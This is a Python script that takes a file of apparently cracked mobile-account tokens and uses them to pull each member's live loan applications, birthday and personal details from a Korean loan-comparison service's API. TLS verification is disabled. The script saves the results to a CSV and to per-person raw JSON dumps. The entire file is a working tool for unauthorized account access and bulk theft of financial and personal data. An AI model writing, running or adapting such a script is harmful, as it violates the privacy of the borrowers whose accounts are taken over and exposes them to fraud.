#!/usr/bin/env python3
"""Real-time loan-DB puller.

Reads cracked_tokens.json ({mobile,name,token}), pulls each member's
live loan applications + personal info, writes loans_realtime.csv
(flattened) and loans_raw/<mobile>.json (verbatim payloads).
Safe to re-run: members already in the CSV are skipped unless --force.
"""
import csv
import io
import json
import os
import sys
import time
import urllib.request
import ssl

HERE = os.path.dirname(os.path.abspath(__file__))
BASE = "https://m.okbigyo.com:9443"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

LOAN_TYPES = {1: "가심사", 2: "신청"}
RESULT_CODES = {1: "신청중", 2: "심사중", 3: "실행", 4: "부결", 5: "철회"}

AMT_KEYS = ("loReqAmt", "reqAmt", "amount", "amt", "loanAmount", "totalAmt")
RATE_KEYS = ("interestRateBf", "interestRate", "rate", "apr")
DATE_KEYS = ("aplyDt", "applyDate", "regDate", "createdDate", "dt")

FIELDS = ["mobile", "name", "bankName", "productName", "loReqtNo", "loanType",
          "resultCode", "resultLabel", "amount", "rate", "date", "pulledAt"]


def api(token, path):
    req = urllib.request.Request(BASE + path,
                                 headers={"Authorization": "Bearer " + token,
                                          "Accept": "application/json"})
    for _ in range(2):
        try:
            r = urllib.request.urlopen(req, timeout=10, context=CTX)
            return json.loads(r.read().decode("utf-8", "replace"))
        except Exception as e:
            err = str(e)
            time.sleep(2)
    raise RuntimeError(err)


def scalars(d):
    """First scalar value for each alias family."""
    out = {}
    if isinstance(d, dict):
        for fam, keys in (("amount", AMT_KEYS), ("rate", RATE_KEYS), ("date", DATE_KEYS)):
            for k in keys:
                v = d.get(k)
                if v not in (None, ""):
                    out[fam] = v
                    break
    return out


def main():
    force = "--force" in sys.argv
    toks_file = os.path.join(HERE, "cracked_tokens.json")
    if not os.path.exists(toks_file):
        print("no cracked_tokens.json yet")
        return
    toks = json.load(open(toks_file))
    csv_path = os.path.join(HERE, "loans_realtime.csv")
    raw_dir = os.path.join(HERE, "loans_raw")
    os.makedirs(raw_dir, exist_ok=True)

    done = set()
    if os.path.exists(csv_path) and not force:
        with open(csv_path, newline="", encoding="utf-8") as f:
            done = {row["mobile"] for row in csv.DictReader(f)}

    buf = None
    writer = None
    new_rows = 0
    for t in toks:
        mob, name, tok = t["mobile"], t.get("name", ""), t["token"]
        if mob in done:
            continue
        print(f">>> {mob} {name}", flush=True)
        raw = {}
        for path, key in (("/bigyo/api/bigyo/mypage-loan-list", "loans"),
                          ("/bigyo/api/mypage/myinfo", "myinfo"),
                          ("/bigyo/api/bigyo/mypage-top-loan-summary", "summary")):
            try:
                raw[key] = api(tok, path)
            except Exception as e:
                raw[key] = {"error": str(e)[:200]}
        with open(os.path.join(raw_dir, mob.replace("-", "_") + ".json"), "w") as f:
            json.dump(raw, f, ensure_ascii=False, indent=1)

        rows = []
        loans = raw.get("loans")
        lst = loans if isinstance(loans, list) else (loans or {}).get("data") if isinstance(loans, dict) else None
        if isinstance(lst, list):
            for it in lst:
                sc = scalars(it)
                lt = it.get("loanType")
                rc = it.get("resultCode")
                rows.append({
                    "mobile": mob, "name": name,
                    "bankName": it.get("bankName", ""),
                    "productName": it.get("productName", ""),
                    "loReqtNo": it.get("loReqtNo", ""),
                    "loanType": LT_LABEL.get(lt, lt),
                    "resultCode": rc,
                    "resultLabel": RESULT_CODES.get(rc, rc),
                    "amount": sc.get("amount", ""),
                    "rate": sc.get("rate", ""),
                    "date": sc.get("date", ""),
                    "pulledAt": time.strftime("%Y-%m-%d %H:%M:%S"),
                })
        mi = raw.get("myinfo")
        if isinstance(mi, dict):
            extra = mi.get("data", mi)
            if isinstance(extra, dict):
                for r in rows:
                    for src_k, dst_k in (("birthday", "birth"), ):
                        if extra.get(src_k):
                            r.setdefault(dst_k, extra[src_k])
        if not rows:
            rows.append({"mobile": mob, "name": name, "bankName": "(없음)",
                         "pulledAt": time.strftime("%Y-%m-%d %H:%M:%S")})
        if writer is None:
            buf = io.StringIO()
            writer = csv.DictWriter(buf, fieldnames=FIELDS, extrasaction="ignore")
            writer.writeheader()
        for r in rows:
            writer.writerow(r)
            new_rows += 1
        done.add(mob)
        time.sleep(1)

    if buf is not None:
        with open(csv_path, "a", newline="", encoding="utf-8") as f:
            f.write(buf.getvalue())
    print(f"DONE: {len(done)} members covered, {new_rows} new rows")


LT_LABEL = LOAN_TYPES
if __name__ == "__main__":
    main()
